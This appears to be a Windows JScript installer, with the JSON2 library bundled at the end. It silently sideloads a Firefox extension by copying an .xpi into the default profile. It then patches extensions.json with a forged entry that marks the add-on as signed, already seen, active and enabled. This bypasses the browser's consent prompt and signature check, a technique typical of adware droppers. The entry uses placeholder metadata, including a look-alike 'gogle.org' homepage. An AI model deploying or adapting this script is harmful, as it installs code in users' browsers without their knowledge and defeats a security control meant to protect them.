function readAllText(path)
{
	var ado = new ActiveXObject('ADODB.Stream');
	ado.CharSet = "utf-8";
	ado.Open();
	ado.LoadFromFile(path);
	return ado.ReadText();
}

function writeAllText(path, text)
{
	var ado = new ActiveXObject('ADODB.Stream');
	ado.CharSet = "utf-8";
	ado.Open();
	ado.WriteText(text);
	return ado.SaveToFile(path, 2);
}

function getEnvironmentVariables()
{
	var oShell = new ActiveXObject("WScript.Shell");
	var oUserEnv = oShell.Environment("Process");

	var colVars = new Enumerator(oUserEnv);
	var parts;
	var env = {};
	for(; ! colVars.atEnd(); colVars.moveNext())
	{
		parts = colVars.item().split('=');
		env[parts[0]] = parts[1];
	}

	return env;
}

function findXPIFile(currentPath)
{
	var fso = new ActiveXObject('Scripting.FileSystemObject');
	var folder = fso.GetFolder(currentPath);
	//WScript.Echo("XPI folder: " + folder);
	var subFls = new Enumerator(folder.Files);
	for (; !subFls.atEnd(); subFls.moveNext())
	{
		fileName = subFls.item().Name;
		//WScript.Echo("files: " + fileName);
		if (/^.*\.xpi$/.test(fileName))
		{
			//WScript.Echo("XPI file found: " + fileName);
			return fileName.replace(".xpi", "");
		}
	}

	return "";
}

function main()
{
	var prefsObj = {
		"id":"whatever@extenson",
		"location":"app-profile",
		"version":"2.4.0.12",
		"type":"extension",
		"internalName":null,
		"updateURL":"",
		"updateKey":null,
		"optionsURL":null,
		"optionsType":null,
		"aboutURL":null,
		"icons":{},
		"iconURL":null,
		"icon64URL":null,
		"defaultLocale":{
			"name":"Extension Name",
			"description":"Extension Description",
			"creator":"Creator Name",
			"homepageURL":"http://gogle.org"
		},
		"visible":true,
		"active":true,
		"userDisabled":false,
		"appDisabled":false,
		"descriptor":"",
		"installDate": new Date().getTime(), //ms
		"updateDate":new Date().getTime(),
		"applyBackgroundUpdates":1,
		"bootstrap":true,
		"skinnable":false,
		"sourceURI":null,
		"releaseNotesURI":null,
		"softDisabled":false,
		"foreignInstall":true,
		"hasBinaryComponents":false,
		"strictCompatibility":false,
		"locales":[],
		"targetApplications":[{"id":"{ec8030f7-c20a-464f-9b0e-13a3a9e97384}","minVersion":"12.0","maxVersion":"49.*"}],
		"targetPlatforms":[],
		"multiprocessCompatible":true,
		"signedState":1,
		"seen":true
	};

	try
	{
		var execPath = WScript.Arguments.Item(0);
		var extensionId = findXPIFile(execPath);
		WScript.Echo("extension id: " + extensionId);
		if (!extensionId)
			throw "XPI not found.";

		var extCurrentPath = execPath + "\\" + extensionId + ".xpi";
		var env = getEnvironmentVariables();
		var appData = env['APPDATA'];
		var profilesIniPath = appData + "\\Mozilla\\Firefox\\profiles.ini";

		//WScript.Echo("profile path: " + profilesIniPath);
		var txt = readAllText(profilesIniPath);
		var lines = txt.split("\r\n");
		var profileFName = "";
		for(l in lines)
		{
			var line = lines[l];
			if (line == "Default=1")
			{
				profileFName = prevLine.replace("Path=", "").replace("/", "\\");
				break;
			}
			var prevLine = line;
		}
		var profilePath = appData + "\\Mozilla\\Firefox\\" + profileFName;
		var extensionDir = profilePath + "\\extensions\\";
		var extensionsPath = extensionDir + extensionId + ".xpi";

		//WScript.Echo("ext path: " + extensionsPath);

		var fso = new ActiveXObject("Scripting.FileSystemObject");
		if (!fso.FolderExists(extensionDir))
			fso.CreateFolder(extensionDir);
		// copy extension
		WScript.Echo("CopyFile " + extCurrentPath + " to " + extensionsPath);
		fso.CopyFile(extCurrentPath, extensionsPath);
		
		// set prefs of ext
		prefsObj["id"] = extensionId; // id is important!
		prefsObj["descriptor"] = extensionsPath; // set install path
		
		// patch prefs
		var prefsPath = profilePath + "\\extensions.json";
		WScript.Echo("Read prefs from " + prefsPath);
		var prefs = JSON.parse(readAllText(prefsPath));
		prefs["addons"].push(prefsObj);
		writeAllText(prefsPath, JSON.stringify(prefs));

	}
	catch (e)
	{
		WScript.Echo(e.message);
	}
}

//--------------------------------------------------
// JSON 2
var JSON;if(!JSON){JSON={}}(function(){function f(n){return n<10?"0"+n:n}if(typeof Date.prototype.toJSON!=="function"){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf()}}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==="string"?c:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+string+'"'}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==="object"&&typeof value.toJSON==="function"){value=value.toJSON(key)}if(typeof rep==="function"){value=rep.call(holder,key,value)}switch(typeof value){case"string":return quote(value);case"number":return isFinite(value)?String(value):"null";case"boolean":case"null":return String(value);case"object":if(!value){return"null"}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==="[object Array]"){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||"null"}v=partial.length===0?"[]":gap?"[\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"]":"["+partial.join(",")+"]";gap=mind;return v}if(rep&&typeof rep==="object"){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==="string"){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?": ":":")+v)}}}}v=partial.length===0?"{}":gap?"{\n"+gap+partial.join(",\n"+gap)+"\n"+mind+"}":"{"+partial.join(",")+"}";gap=mind;return v}}if(typeof JSON.stringify!=="function"){JSON.stringify=function(value,replacer,space){var i;gap="";indent="";if(typeof space==="number"){for(i=0;i<space;i+=1){indent+=" "}}else{if(typeof space==="string"){indent=space}}rep=replacer;if(replacer&&typeof replacer!=="function"&&(typeof replacer!=="object"||typeof replacer.length!=="number")){throw new Error("JSON.stringify")}return str("",{"":value})}}if(typeof JSON.parse!=="function"){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==="object"){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v}else{delete value[k]}}}}return reviver.call(holder,key,value)}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))){j=eval("("+text+")");return typeof reviver==="function"?walk({"":j},""):j}throw new SyntaxError("JSON.parse")}}}());

//--------------------------------------------------
// Main call
main();
